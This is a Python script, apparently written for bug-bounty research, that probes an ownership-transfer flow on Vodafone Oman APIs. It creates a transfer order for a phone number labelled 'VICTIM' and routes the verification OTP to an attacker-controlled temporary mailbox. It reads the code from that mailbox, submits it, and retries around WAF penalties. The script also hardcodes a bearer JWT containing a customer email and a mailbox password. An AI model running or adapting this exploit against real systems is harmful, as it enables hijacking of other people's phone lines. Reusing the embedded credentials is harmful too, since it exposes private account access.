#!/usr/bin/env python3
"""Self-contained vfo02/vfo26 ownership-transfer probe for a CLEAN (non-penalized) IP.
Run:  python3 user_ip_probe.py
Reads nothing from disk except its own output. Waits up to ~8 min for WAF penalties
(auto-retries). Writes user_ip_probe_result.json next to itself.
Vodafone JWT valid until ~21:58 UTC (30-min TTL).
"""
import json, time, uuid, re, os, sys
import urllib.error, urllib.request

UA = ("Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) "
      "Version/4.0 Chrome/120.0 Mobile Safari/537.36 h1.recon")
V2 = "https://vfo02.vodafone.om"
V26 = "https://vfo26.vodafone.om"
JWT = "eyJraWQiOiI2YjVlZTE3YjE2YjQ0YTBmYTJlN2FjMDE4MWM4NTBjYyIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiJpbmV0OmU5MDVkOTVmLTMxZTItNDg5OS1hYjE4LWRmZWQxYjUyZTZmMyIsImF1ZCI6WyJNVkFfWkRTIiwiRFhMX1NQTSIsIkRYTF9aTVMiLCJDSEFUIiwiTVZBIiwiRFhMX09UUCIsIkRYTF9DWEMiLCJEWExfU0NNIiwiPFZGTz4iXSwiY19oYXNoIjoiTWdIZkFGSTN4Qmg2VlJuTGJNTl9lQSIsImF6cCI6Ik1WQSIsImF1dGhfdGltZSI6MTc5MjAxMzI4NSwic2NvcGUiOlsiY3VzdG9tZXJzIl0sImlzcyI6Imh0dHBzOi8vaXNndy5wci5pdGNsb3VkLnZvZGFmb25lLm9tIiwiZXhwIjoxNzkyMDE1MDg2LCJjdXN0b21lcl9pZCI6ImU5MDVkOTVmLTMxZTItNDg5OS1hYjE4LWRmZWQxYjUyZTZmMyIsImlhdCI6MTc5MjAxMzI4NiwiZW1haWwiOiJoMWJmNDg1MDg2NGJAbWF4eHNwYWNlLmNvbSJ9.VfYe8RnKhD_QbfMX2zX_2I8tFOJzUIXUqCIcLpMxleKKTClor2utm7Do8eY_6TdQVx25r0I9Ki0wpUyIpiOqh-c1dM17pwHtZqT5GuzH4Ez8OlOTyoqxFTA93cK_Azjh77MDjy66B0o4EeJT5iI4fm7wI2xOFfenXQfF1Ykb5M6VQNMXFPqfuPJhl38eExYC937fBV1fyGcrIG6-ixSUaoEb2hImmmnMEXv6TtRDEqpDHaZz3CJCDk-35IUDzHN8-Ix0N6OYEanbg-EkQ-xXKcWz_hqQ2EXVPtJRvfs8aQdWI7amyvuuFKG8fedHYi20UKlcYvBLRe4oiMTksTgB6w"
MAIL_ADDR = "h1bf4850864b@maxxspace.com"
MAIL_PASS = "h8-sKMzjGGzQu09EaQlV4g"
OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "user_ip_probe_result.json")
EMAIL = MAIL_ADDR
VICTIM = "77101717"

rec = {"ts0": time.strftime("%H:%M:%SZ", time.gmtime()), "steps": []}

def log(**kw):
    kw["ts"] = time.strftime("%H:%M:%SZ", time.gmtime())
    rec["steps"].append(kw)
    print("[uip] " + json.dumps(kw)[:300], flush=True)

def finish(result):
    rec["result"] = result
    rec["ts1"] = time.strftime("%H:%M:%SZ", time.gmtime())
    try:
        json.dump(rec, open(OUT, "w"), indent=2)
    except Exception as e:
        print("write-fail", e, flush=True)
    print("[uip] DONE result=" + result, flush=True)
    sys.exit(0)

def req(base, path, body=None, bearer=None, method=None, timeout=40,
        ctype="application/json", headers=None):
    h = {"User-Agent": UA, "Accept": "application/json",
         "X-Application-ID": "MVA_ANDROID", "X-Request-ID": str(uuid.uuid4()),
         "X-Correlation-ID": str(uuid.uuid4()),
         "Zen-Application": "MVA", "Zen-OS": "android", "Zen-AppVersion": "5.2.2"}
    if headers:
        h.update(headers)
    if body is not None:
        h["Content-Type"] = ctype
    if bearer:
        h["Authorization"] = "Bearer " + bearer
    data = json.dumps(body).encode() if body is not None else None
    m = method or ("POST" if data is not None else "GET")
    r = urllib.request.Request(base + path, data=data, headers=h, method=m)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as x:
            return x.status, x.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, "<net-error> " + str(e)[:200]

def is_penalty(st, b):
    return st == 200 and b.lstrip()[:14] in ("<!DOCTYPE html>", "<!doctype html>") or (
        st == 200 and "<html" in b[:200].lower())

def step(name, base, path, body=None, bearer=None, method=None, retries=3,
         retry_sleep=60):
    """Fire a request; if WAF penalty HTML or net-error, wait and retry."""
    for att in range(retries):
        st, b = req(base, path, body=body, bearer=bearer, method=method)
        if is_penalty(st, b) or st == 0:
            log(step=name + "_retry%d" % att, http=st, raw=b[:120],
                action="waf-penalty-or-neterror, sleeping %ds" % retry_sleep)
            time.sleep(retry_sleep)
            continue
        log(step=name, http=st, raw=b[:900])
        try:
            return st, json.loads(b), b
        except Exception:
            return st, None, b
    return st, None, b

# --- mail.tm token (fresh) ---
try:
    resp = urllib.request.urlopen(urllib.request.Request(
        "https://api.mail.tm/token",
        data=json.dumps({"address": MAIL_ADDR, "password": MAIL_PASS}).encode(),
        headers={"Content-Type": "application/json", "User-Agent": UA}),
        timeout=30)
    TOK = json.loads(resp.read())["token"]["token"]
    log(step="mail_token_ok")
except Exception as e:
    log(step="mail_token_fail", err=str(e)[:120])
    finish("mail_token_fail")

def mail(path):
    r = urllib.request.Request("https://api.mail.tm" + path,
                               headers={"Authorization": "Bearer " + TOK,
                                        "User-Agent": UA})
    return urllib.request.urlopen(r, timeout=30).read().decode("utf-8", "replace")

def newest_msg_id():
    try:
        ms = json.loads(mail("/messages?sort=receivedAt:desc&limit=3"))["hydra:member"]
        return ms[0]["id"] if ms else "0"
    except Exception:
        return "0"

def msg_code(mid):
    try:
        d = json.loads(mail("/messages/" + mid))
        html = d.get("html") or ""
        if isinstance(html, list):
            html = " ".join(p.get("content", "") if isinstance(p, dict) else str(p) for p in html)
        txt = d.get("text") or ""
        if isinstance(txt, list):
            txt = " ".join(str(x) for x in txt)
        m = re.search(r"otpCode=(\d{4})", html + " " + txt)
        return (m.group(1), d.get("subject", "")) if m else (None, d.get("subject", ""))
    except Exception as e:
        return None, str(e)[:80]

# --- 0) auth sanity (GET passes the edge even when penalized) ---
st, j, b = step("auth_sanity", V2, "/api/public/numbers/v1/current", bearer=JWT,
                retries=3)
log(step="auth_sanity_note", note="404 Not found = JWT OK, reached backend")

# --- 1) create order (victim line, donor email = our mailbox) ---
body = {
    "orderType": "TRANSFER_OWNERSHIP_DONOR",
    "msisdn": VICTIM,
    "items": [
        {"title": "DONOR", "value": VICTIM,
         "characteristics": [{"name": "EMAIL", "value": EMAIL}]},
        {"title": "PLAN_TYPE", "value": "PREPAID"},
    ],
}
st, jo, b = step("create_order", V2, "/dxl/api/public/orders/v2.1",
                 body=body, bearer=JWT, retries=4, retry_sleep=90)
order_id = (jo or {}).get("id") or ((jo or {}).get("order") or {}).get("id")
log(step="order_id", id=order_id, http=st, raw=b[:400])
if not order_id:
    finish("no_order")

# --- 2) send OTP (vfo26) ---
marker = newest_msg_id()
log(step="mail_marker", mid=marker)
st, js, b = step("send_otp", V26, "/api/public/otp/v1/send",
                 body={"id": order_id}, bearer=JWT, retries=3)
otp_id = (js or {}).get("id")
rec["send_otp"] = js
log(step="otp_fields", id=otp_id,
    attemptsLeft=(js or {}).get("otpAttemptsLeft"),
    resendIn=(js or {}).get("otpResendIn"),
    expiresIn=(js or {}).get("otpExpiresIn"),
    status=(js or {}).get("status"))

# --- 3) poll OUR mailbox for the transfer OTP (email-based?) ---
mail_hit = None
deadline = time.time() + 180
while time.time() < deadline:
    time.sleep(20)
    mid = newest_msg_id()
    if mid != marker and mid and mid != "0":
        code, subj = msg_code(mid)
        log(step="new_mail", mid=mid, subject=str(subj)[:80], code=code)
        if code:
            mail_hit = code
            rec["transfer_otp_by_email"] = True
            break

# --- 4) verify: REAL code first if we have it, else one wrong code ---
def patch_code(name, code):
    p = {"items": [{"title": "OTP", "value": code,
                    "characteristics": ([{"name": "OTP_ID", "value": otp_id}]
                                        if otp_id else [])}]}
    st, jv, b = step(name, V2, "/dxl/api/public/orders/v2.1/" + str(order_id),
                     body=p, bearer=JWT, method="PATCH", retries=3)
    return jv

if mail_hit:
    rec["verify_real"] = patch_code("verify_real_code", mail_hit)
    rec["verify_wrong"] = patch_code("verify_wrong_after_real", "0000")
else:
    rec["verify_wrong"] = patch_code("verify_wrong", "0000")

# --- 5) state + cleanup (DELETE the order) ---
st, jf, b = step("order_state", V2, "/dxl/api/public/orders/v2.1/" + str(order_id),
                 bearer=JWT, retries=2)
st, jd, b = step("delete_order", V2, "/dxl/api/public/orders/v2.1/" + str(order_id),
                 bearer=JWT, method="DELETE", retries=2)
rec["order_state"] = jf

finish("done")
